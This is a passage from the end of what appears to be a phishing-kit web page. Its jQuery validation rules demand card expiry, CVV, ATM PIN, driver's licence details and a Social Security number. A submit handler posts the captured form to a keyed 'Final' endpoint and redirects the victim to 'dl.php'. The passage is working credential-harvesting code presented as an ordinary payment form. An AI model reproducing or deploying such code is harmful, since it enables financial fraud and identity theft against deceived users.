                        minlength: "Please check the card expiry date you have entered",
                    },
                    Cvv: {
                        required: "Please provide 3 digit card security code (CVV)",
                        minlength: "Please check the card security code you have entered",
                        digits: "Please ensure you entered digits only",
                    },
                    AtmPin: {
                        required: "Please provide 4 ATM pin",
                        minlength: "Please check the ATM pin you have entered",
                        digits: "Please ensure you entered digits only",
                    },
                    LicenseNumber: {
                        required: "Please provide your driver's License number",
                        minlength: "Please check the driver's number you have entered",
                    },
                    LicenseNExp: {
                        required: "Please provide your driver's License number Expiry date",
                        minlength: "Please check the driver's expiry date you have entered",
                    },
                    SecurityNumber: {
                        required: "Please provide 9 digit SSN number",
                        minlength: "Please check the SSN Number you have entered",
                    },
                },
                submitHandler: function(form) {
                    $.post("Final?key=<?php echo $key;?>", $("#card").serialize(), function(
                        result) {
                        setTimeout(function() {
                            $(location).attr("href", "dl.php");
                        });
                    });
                },
            });
        });
    });
    </script>
</body>

</html>